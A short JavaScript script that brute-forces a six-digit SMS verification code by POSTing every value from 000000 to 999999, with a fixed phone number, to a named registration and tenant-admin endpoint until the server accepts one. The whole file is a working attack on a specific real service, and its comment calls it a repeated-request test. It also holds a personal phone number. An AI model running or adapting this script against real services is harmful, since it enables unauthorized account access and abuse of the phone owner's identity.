const xhr = new XMLHttpRequest();
let i = 0;
let timer = setTimeout(() => start(i++), 0);
let preTime = Date.now()
xhr.onreadystatechange = function () {
  //若响应完成且请求成功
  if (xhr.readyState === 4 && xhr.status === 200) {
    //do something, e.g. request.responseText
    let response = {};
    try {
      response = JSON.parse(xhr.response);
    } catch (e) {
      console.error(e);
    }
    if (response.code === 200 || response.code === "200") {
      console.log(xhr);
      console.log("code", i);
      return
    } else {
      console.log(i, ":" + response.code, xhr.response,Date.now()-preTime + ' ms');
      preTime = Date.now()
    }
    if (i > 999999) {
      return clearTimeout(timer);
    }
    timer = setTimeout(() => start(i++), 0);
  }
};

const start = (code) => {
  code = String(code);
  code = "0".repeat(6 - code.length) + code;
  xhr.open(
    "POST",
    "https://register.gamma.welink.huawei.com/tenant-admin/company/v1/tenants/list?language=zh&lang=zh&r=1635128979789",
    true
  );
  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhr.send(
    JSON.stringify({
      language: "zh",
      lang: "zh",
      phone: "+86-15356565464",
      code: code,
      description: "多次请求测试",
    })
  );
};
